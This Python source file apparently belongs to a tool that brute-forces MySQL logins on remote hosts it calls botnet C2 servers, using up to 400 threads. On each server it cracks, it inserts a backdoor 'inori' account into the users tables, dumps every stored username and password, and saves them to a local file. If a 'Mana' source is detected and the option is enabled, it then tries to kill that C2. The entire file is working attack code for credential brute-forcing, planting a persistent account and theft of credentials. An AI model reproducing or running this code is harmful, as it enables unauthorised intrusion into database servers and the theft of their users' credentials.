from concurrent.futures import ThreadPoolExecutor
from pymysql            import connect
from json               import load, dump

from .killer      import ManaKiller

from lib.constants  import SQL_FILTER
from lib.constants  import INORI, MANA
from lib.colors     import Colors


class Bruter:
    CONFIG = load(open('config.json'))
    
    def __init__(self: object, ip_list: list = list) -> None:
        self.combos:  str  = open('lib/creds.txt').readlines()
        self.results: list = []
        
        self.kill_enabled: bool   = self.CONFIG['kill_enabled']
        self.killer:       object = ManaKiller()
        
        self.ip_list: list = ip_list
                
                
                
    @staticmethod    
    def update_db(entry: dict) -> bool | None: 
        """Update database with our new entry
        
            Return: bool
        """
        with open('database.json','r+') as database_file:
            file_data: dict = load(database_file)
            
            if not entry in file_data['results_database']:
                file_data['results_database'].append(entry)
                database_file.seek(0)
                dump(file_data, database_file, indent = 4)
                return True
                
               
               
    def run(self: object) -> None:
        """Execute operation using threads.
        
            Return: None
        """
        with ThreadPoolExecutor(max_workers=400) as executor:
            for cnc_server in self.ip_list:
                executor.submit(self.injection, cnc_server)
                    
                    
                    
    def injection(self: object, cnc_server: dict) -> None:
        """ Inject our custom login into the SQL Server
            if login was a success.
            
             - cnc_server is the entry being updated.
            
             Return: Dictionary containing results
        """
        for cred in self.combos:
            username, _, password = cred.strip().partition(':')
                
            try:
                # NOTE: Attempt to login SQL server.
                with connect(user = username, password = password, host = cnc_server['ip'], connect_timeout = 5) as conn:
                    database_lists: list = []
                    # NOTE: If log in was a success then update the 
                    # NOTE: cnc_server dictionary with login credentials used.
                    cnc_server.update({'mysql_login': f'{username}:{password}'})
                    cursor = conn.cursor()
                        
                    # NOTE: Attempt to show all the databases in the SQL server.
                    cursor.execute('show databases')
                        
                        
                    # NOTE: Check each database for the users table.
                    for db in [db[0] for db in cursor.fetchall() if not db[0] in SQL_FILTER]:
                        cursor.execute(f'use {db};')
                            
                        try:
                            # NOTE: Inject our custom login into the users table.
                            cursor.execute(f"INSERT INTO users VALUES (NULL, 'inori', 'lmaowtf', 0, 0, 0, 0, -1, 1, 30, '');")
                            # NOTE: Select users table so we can 
                            # NOTE: dump the credentials out.
                            cursor.execute('SELECT * from users')
                        except:
                            # NOTE: users table was not found (failed to inject to and select the table).
                            database_lists.append({db : ['Users table not found.']})
                            continue
                            
                        database_creds: list = [] # Database credentials get saved here.
                        # NOTE: Dump all the credentials in the database. (users table was found)
                        for row in cursor.fetchall():
                            if row[1] and row[2] and not f'{row[1]}:{row[2]}' in database_creds:
                                database_creds.append(f'{row[1]}:{row[2]}')
                                                    
                        database_lists.append({db : database_creds})  

                          
                    # NOTE: Update our dictionary with all the databases & credentials.      
                    cnc_server.update({'databases': database_lists})
                    # NOTE: Save entry to self.results (objects results)
                    self.results.append(cnc_server)
                    
                    # NOTE: Print out the successful results as we go along.
                    print(f"""{Colors.LIME}• {INORI} {Colors.WHITE}has logged in {Colors.PINKRED}{cnc_server['ip']} {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['mysql_login']}{Colors.WHITE}) {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['arch']}{Colors.WHITE})""")
                    print(f' {Colors.LIGHTPINK}• {Colors.WHITE}Dumping databases...')
                    if cnc_server['databases']:
                        for database in cnc_server['databases']:
                            for db, creds in database.items():
                                print(f'   {Colors.PINKRED}• {Colors.LIGHTPINK}{db}{Colors.WHITE}: {Colors.PINKRED}{f"{Colors.WHITE},{Colors.PINKRED} ".join(creds)}')
                    else:
                        print(f'  {Colors.RED}• {Colors.WHITE}No database found.')
                        
                        
                    self.killer.addr = cnc_server['ip']
                    # NOTE: Detect whether the CNC is a Mana V4 source.
                    if self.killer.verify_mana(cnc_server['arch']):
                        print(f'{Colors.LIME}• {MANA} {Colors.WHITE}source detected!')
                        
                        if self.kill_enabled:
                            # NOTE: Kill the CNC.
                            if self.killer.execute():
                                print(f'    {Colors.LIME}• {Colors.WHITE}Killed {MANA} {Colors.WHITE}source!')
                            else:
                                print(f'    {Colors.RED}• {Colors.WHITE}Failed to kill {MANA} {Colors.WHITE}source.')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}No {MANA} {Colors.WHITE}source detected.')
                                
                           
                    # NOTE: Update local results database (database.json).    
                    if self.update_db(cnc_server):
                        print(f'{Colors.LIME}• {Colors.WHITE}Query added to local results database.')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}Query already in local results database.')
                            
                    print()
                    return
            except:
                continue
